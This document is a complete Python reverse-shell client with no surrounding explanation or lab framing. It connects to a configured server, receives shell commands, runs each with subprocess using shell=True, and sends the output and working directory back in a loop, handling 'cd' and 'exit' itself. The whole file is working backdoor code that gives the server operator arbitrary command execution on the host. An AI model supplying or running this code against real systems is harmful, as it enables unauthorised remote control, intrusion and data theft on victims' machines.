import socket
import os
import subprocess

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 8443
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
SEPARATOR = b"<sep>"

# create the socket object
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# get the current directory
cwd = os.getcwd()
s.send(cwd.encode())

while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE)

    if command.lower() == b"exit":
        # if the command is exit, just break out of the loop
        break

    if command.startswith(b"cd"):
        # cd command, change directory
        try:
            os.chdir(command[3:].strip())
            output = b"Changed directory to " + os.getcwd().encode()
        except FileNotFoundError as e:
            # if there is an error, set as the output
            output = str(e).encode()
        else:
            # if operation is successful, empty message
            output = b""
    else:
        # execute the command and retrieve the results
        try:
            output = subprocess.check_output(command, shell=True)
        except Exception as e:
            output = str(e).encode()

    # get the current working directory as output
    cwd = os.getcwd()
    # send the results back to the server
    message = output + SEPARATOR + cwd.encode()
    s.send(message)

# close client connection
s.close()
